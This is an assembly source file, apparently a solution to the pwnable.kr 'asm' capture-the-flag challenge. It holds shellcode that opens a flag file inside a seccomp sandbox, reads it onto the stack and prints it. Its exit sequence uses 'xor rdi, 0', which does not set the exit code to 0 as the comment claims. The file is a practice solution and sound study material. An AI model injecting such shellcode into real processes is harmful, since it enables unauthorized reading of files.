; Shellcode for asm challenge
; Runs in seccomp sandbox and only allows open, read, and write syscalls.

global _start

section .text

_start:
    sub rsp, 32 ; room for the flag

    jmp file_name

CONTINUE:
    pop rcx

    mov rdi, rcx ; pointer to string
    mov rsi, 0 ; O_RDONLY, found in /usr/include/bits/fcntl-linux.h
    mov rax, 2 ; set open syscall
		; arch/x86/entry/syscalls/syscall_64.tbl
    syscall ; call open
    
    mov rdi, rax ; move fd into rdi
    mov rsi, rsp ; pointer to buffer
    mov rdx, 32 ; max buffer size
    mov rax, 0 ; set read syscall
    syscall ; call read
   
    mov rdi, 1 ; set fd 1 for stdout
    mov rsi, rsp ; pointer to buffer
    mov rdx, 32 ; set len to 32
    mov rax, 1 ; set write syscall
    syscall ; call write

    add rsp, 32 ; decrement stack pointer

    ; exit
    mov rax, 60 ; exit syscall 60
    xor rdi, 0 ; exit code 0
    syscall ; call exit

file_name:
    call CONTINUE
    db "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong", 00h
